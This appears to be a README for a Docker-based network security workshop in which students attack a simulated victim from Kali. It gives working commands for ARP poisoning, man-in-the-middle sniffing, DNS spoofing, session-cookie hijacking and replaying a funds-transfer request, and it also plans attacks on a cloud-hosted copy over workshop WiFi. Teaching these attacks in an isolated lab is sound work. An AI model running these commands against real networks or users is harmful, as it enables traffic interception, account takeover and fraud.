# 🛡️ Network Security Workshop Lab

A hands-on lab environment for learning network traffic interception, analysis, and manipulation.

> ⚠️ **EDUCATIONAL USE ONLY.** These tools and techniques are for authorized learning environments only. Unauthorized network attacks are illegal.

---

## 🗺️ Network Map

```
┌─────────────────────────────────────────────────────┐
│                 Lab Network: 10.0.0.0/24            │
│                                                     │
│   ┌──────────┐     ┌──────────┐     ┌──────────┐   │
│   │  VICTIM  │────▶│  SERVER  │     │   DNS    │   │
│   │ 10.0.0.15│     │ 10.0.0.20│     │ 10.0.0.30│   │
│   │ (Alpine) │     │ (Nginx)  │     │(dnsmasq) │   │
│   └──────────┘     └──────────┘     └──────────┘   │
│        │                ▲                           │
│        │    YOU ATTACK  │                           │
│        │    THIS TRAFFIC│                           │
│        ▼                │                           │
│   ┌─────────────────────────┐                       │
│   │    YOUR KALI MACHINE    │                       │
│   │       10.0.0.10         │                       │
│   │  (tcpdump, arpspoof,    │                       │
│   │   dnsspoof, wireshark)  │                       │
│   └─────────────────────────┘                       │
└─────────────────────────────────────────────────────┘
```

The **Victim** container simulates a user constantly logging in and transferring funds to the **Server**. Your Kali machine joins this network so you can sniff, intercept, and manipulate the traffic.

---

## 🚀 Quick Setup (5 min)

### 1. Install Docker in Kali

```bash
sudo apt update
sudo apt install -y docker.io docker-compose-plugin
sudo systemctl start docker
sudo systemctl enable docker

# Add yourself to the docker group (avoids needing sudo for docker commands)
sudo usermod -aG docker $USER
newgrp docker
```

### 2. Clone and Launch the Lab

```bash
git clone https://github.com/icyclestick/dns-workshop-2.git
cd dns-workshop-2

# Start the victim network
docker compose up -d

# Connect your Kali to the lab network
sudo ./setup.sh
```

You should see:
```
╔══════════════════════════════════════════════════╗
║   LAB NETWORK READY                              ║
╚══════════════════════════════════════════════════╝

  Your IP (Attacker):  10.0.0.10
  Victim:              10.0.0.15
  Server:              10.0.0.20
  DNS:                 10.0.0.30
```

### 3. Verify

```bash
# Can you reach the server?
curl http://10.0.0.20/login

# Can you see victim traffic?
sudo tcpdump -i br-$(docker network ls --filter name=lab_net -q | head -c12) -c 5 host 10.0.0.15
```

---

## 🔬 Lab Exercises

### Lab 1: Packet Sniffing (Topic 27)

**Goal:** Capture and read the victim's HTTP traffic.

```bash
# Sniff all traffic from the victim, show ASCII content
sudo tcpdump -i br-$(docker network ls --filter name=lab_net -q | head -c12) -A host 10.0.0.15
```

**What to look for:**
- The victim's `GET /login` and `POST /transfer` requests
- `Cookie: session_token=s3cr3t-t0k3n-abc123xyz` in the headers
- `Authorization: Bearer eyJhbGciOiJI...` JWT token
- The JSON body: `{"to":"user2","amount":500}`

> 💡 **Takeaway:** Unencrypted HTTP traffic exposes everything — cookies, tokens, request bodies.

---

### Lab 2: CLI Packet Capture (Topic 33)

**Goal:** Save captured packets to a file for later analysis.

```bash
# Capture 50 packets and save to a file
sudo tcpdump -i br-$(docker network ls --filter name=lab_net -q | head -c12) -w capture.pcap -c 50 host 10.0.0.15

# Read the saved capture
tcpdump -r capture.pcap -A | head -100

# You can also open capture.pcap in Wireshark
wireshark capture.pcap &
```

---

### Lab 3: ARP Poisoning (Topic 30)

**Goal:** Position yourself between the victim and server by poisoning their ARP tables.

First, install the tools:
```bash
sudo apt install -y dsniff
```

**Check normal ARP tables:**
```bash
# See who the victim thinks the server is
docker exec lab-victim arp -a
```

**Launch the attack (2 terminals):**

Terminal 1 — Tell the victim "I am the server":
```bash
sudo arpspoof -i br-$(docker network ls --filter name=lab_net -q | head -c12) -t 10.0.0.15 10.0.0.20
```

Terminal 2 — Tell the server "I am the victim":
```bash
sudo arpspoof -i br-$(docker network ls --filter name=lab_net -q | head -c12) -t 10.0.0.20 10.0.0.15
```

> IP forwarding was already enabled by `setup.sh`, so traffic still flows through you transparently.

**Verify it works:**
```bash
# Check the victim's ARP table again — your MAC should appear as the server
docker exec lab-victim arp -a

# Now ALL victim↔server traffic passes through you
sudo tcpdump -i br-$(docker network ls --filter name=lab_net -q | head -c12) -A host 10.0.0.15 and host 10.0.0.20
```

> 💡 **Takeaway:** ARP has no authentication. Any device on the LAN can claim to be any other device.

---

### Lab 4: Man-in-the-Middle (Topic 28)

**Goal:** With ARP poisoning active, intercept and read all communication.

This is the payoff from Lab 3. With arpspoof still running:

```bash
# See everything — full HTTP requests/responses between victim and server
sudo tcpdump -i br-$(docker network ls --filter name=lab_net -q | head -c12) -A -s0 host 10.0.0.15
```

You should now see **complete** HTTP conversations — request headers, response bodies, cookies, and form data flowing through your machine.

> 💡 **Takeaway:** MitM = Position + Capture. ARP poisoning provides the position, tcpdump provides the capture.

---

### Lab 5: DNS Spoofing (Topic 29)

**Goal:** Redirect the victim's DNS lookups to your machine.

The victim uses `lab-dns` (10.0.0.30) to resolve `workshop.lab` → `10.0.0.20`.

With ARP poisoning still active against the DNS server:

Terminal 1 — Poison the victim↔DNS path:
```bash
sudo arpspoof -i br-$(docker network ls --filter name=lab_net -q | head -c12) -t 10.0.0.15 10.0.0.30
```

Terminal 2 — Spoof DNS responses:
```bash
# Create a hosts file pointing workshop.lab to your IP
echo "10.0.0.10 workshop.lab" > /tmp/fakehosts

sudo dnsspoof -i br-$(docker network ls --filter name=lab_net -q | head -c12) -f /tmp/fakehosts host 10.0.0.15 and udp port 53
```

**Verify:**
```bash
# From the victim, workshop.lab should now resolve to YOU
docker exec lab-victim nslookup workshop.lab 10.0.0.30
```

> 💡 **Takeaway:** DNS has no built-in authentication. A MitM attacker can forge DNS responses to redirect users anywhere.

---

### Lab 6: Session Hijacking (Topic 31)

**Goal:** Steal a session cookie from captured traffic and use it.

From your tcpdump captures in Labs 1-4, you already saw:
```
Cookie: session_token=s3cr3t-t0k3n-abc123xyz
```

Use the stolen cookie to access the server as the victim:
```bash
# Use the stolen session cookie
curl -v -b "session_token=s3cr3t-t0k3n-abc123xyz" http://10.0.0.20/transfer
```

**Result:** You get a `200 OK` — you've hijacked the victim's session without knowing their password.

> 💡 **Takeaway:** Cookies without `HttpOnly` and `Secure` flags, sent over plain HTTP, are trivially stealable.

---

### Lab 7: Replay Attacks (Topic 32)

**Goal:** Replay a captured transfer request multiple times.

From the tcpdump output, you captured the transfer request. Replay it:

```bash
# Replay the exact same request 5 times
for i in $(seq 1 5); do
  curl -s -X POST http://10.0.0.20/transfer \
    -b "session_token=s3cr3t-t0k3n-abc123xyz" \
    -H "Content-Type: application/json" \
    -d '{"to":"hacker","amount":500}'
  echo ""
  echo "--- Replay #$i complete ---"
done
```

**Result:** All 5 requests return `200 OK` with success messages. The server processes each one as a new, legitimate transfer.

> 💡 **Takeaway:** Without CSRF tokens, nonces, or timestamp validation, captured requests can be replayed infinitely.

---

## 🧹 Teardown

```bash
# Stop the lab
docker compose down

# Remove images (optional)
docker compose down --rmi all
```

---

## ☁️ Phase 2: Cloud Attack (EC2)

After completing the local labs, pivot to attacking a live cloud-hosted version of the vulnerable app. See [DEPLOY_EC2.md](./DEPLOY_EC2.md) for deployment instructions.

Participants use Wireshark on the workshop WiFi to capture plain-text HTTP traffic to the EC2 instance, then apply the same session hijacking and replay attack techniques from Labs 6 & 7.

---

## 📚 Topics Covered

| Lab | Topic | Concepts |
|-----|-------|----------|
| 1 | Packet Sniffing (27) | Capturing network packets, monitoring traffic |
| 2 | CLI Packet Capture (33) | tcpdump, saving .pcap files |
| 3 | ARP Poisoning (30) | ARP protocol, MAC-IP mapping, traffic redirection |
| 4 | Man-in-the-Middle (28) | Intercepting communication, attacker positioned between endpoints |
| 5 | DNS Spoofing (29) | Fake DNS responses, redirecting to malicious servers |
| 6 | Session Hijacking (31) | Stealing session cookies, taking over sessions |
| 7 | Replay Attacks (32) | Reusing captured packets, impersonation |
